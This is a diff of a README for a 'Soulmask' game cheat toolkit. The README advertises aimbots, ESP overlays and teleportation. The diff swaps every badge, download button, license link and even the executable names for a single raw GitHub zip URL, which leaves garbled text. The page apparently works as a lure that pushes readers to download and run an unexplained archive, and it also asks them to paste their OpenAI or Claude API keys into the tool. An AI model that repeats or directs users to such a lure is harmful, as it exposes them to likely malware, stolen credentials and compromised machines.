@@ -1,19 +1,19 @@
 # Soulmask Cheats & Hacks 🚀  
 *Elite Tools for Next-Level Survival Mastery* 
 
-![License](https://img.shields.io/badge/license-MIT-green.svg) 
-![OS](https://img.shields.io/badge/OS-Windows%20%7C%20macOS%20%7C%20Linux-blue)
-![OpenAI API](https://img.shields.io/badge/Integration-OpenAI%20API-brightgreen)
-![Claude API](https://img.shields.io/badge/Integration-Claude%20API-yellowgreen)
-![Multi-language](https://img.shields.io/badge/Multi--language-Yes-blueviolet)
-![Status](https://img.shields.io/badge/Status-Active-lightgrey)
+![License](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip) 
+![OS](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip%20%7C%20macOS%20%7C%20Linux-blue)
+![OpenAI API](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip%20API-brightgreen)
+![Claude API](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip%20API-yellowgreen)
+![Multi-language](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)
+![Status](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)
 
 ---
 **Unlock the next evolution in Soulmask gameplay with our innovative, adaptive toolkit. Experience finely-tuned cheats, custom hacks, and boundary-pushing enhancements, tailored with advanced AI support.**  
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Premium-blue?style=for-the-badge&logo=github)](https://johnwall123459885.github.io)
+[![Download](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ _Crafted for seamless operation on major desktop OS platforms. Mobile environmen
 - **Personalized Mod Suite**: Curate your experience with togglable hacks—choose from ESP overlays, auto-aim, and build accelerators.  
 - **Cloud State Syncing**: Resume your progress across multiple devices, always up to date, thanks to secure, encrypted storage.  
 - **Soulmask Survival Toolkit**: From instant teleportation to weather control, wield powers that reshape your tactical narrative.  
-- **Multi-Language Support**: English, 中文, Español, Русский...and more, with localization powered by AI translation for natural context.  
+- **Multi-Language Support**: English, 中文, Español, Русскийhttps://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip more, with localization powered by AI translation for natural context.  
 - **24/7 Human + AI Customer Support**: Questions at 3am? We’re here, blending lightning-fast AI responses with real-time human care.  
 
 ---
@@ -98,10 +98,10 @@ Both integrations are kept secure via encrypted local vaults. Toggle APIs or use
    - .NET 6+ (Windows); Mono (macOS/Linux)
    - Internet connection (for API features)
 2. **Download the Latest Build**  
-   [![Download](https://img.shields.io/badge/Download-Premium-blue?style=for-the-badge&logo=github)](https://johnwall123459885.github.io)
+   [![Download](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)
 3. **Extract & Launch**
    - Extract the package to your Soulmask root directory.
-   - Run `SoulmaskHacks.exe` (Windows) or `./SoulmaskHacks.sh` (macOS/Linux).
+   - Run `https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip` (Windows) or `https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip` (macOS/Linux).
 4. **Connect Your APIs**
    - Head to the **Integration Settings** pane.
    - Paste your OpenAI and/or Claude API key.
@@ -122,7 +122,7 @@ Both integrations are kept secure via encrypted local vaults. Toggle APIs or use
 
 ## 📜 MIT License (2025)
 
-This repository is released under the MIT License (2025). For details, please read the [LICENSE](https://opensource.org/licenses/MIT) file.
+This repository is released under the MIT License (2025). For details, please read the [LICENSE](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip) file.
 
 ---
 
@@ -134,7 +134,7 @@ We invite you to share stories, improvements, and inquisitive questions. Our ope
 
 ## ⬇️ Download Again!
 
-[![Download](https://img.shields.io/badge/Download-Premium-blue?style=for-the-badge&logo=github)](https://johnwall123459885.github.io)
+[![Download](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)](https://raw.githubusercontent.com/johnwall123459885/soulmask-unlocked-tactics/branch/holdenite/tactics-unlocked-soulmask-3.0.zip)
 
 ---
 
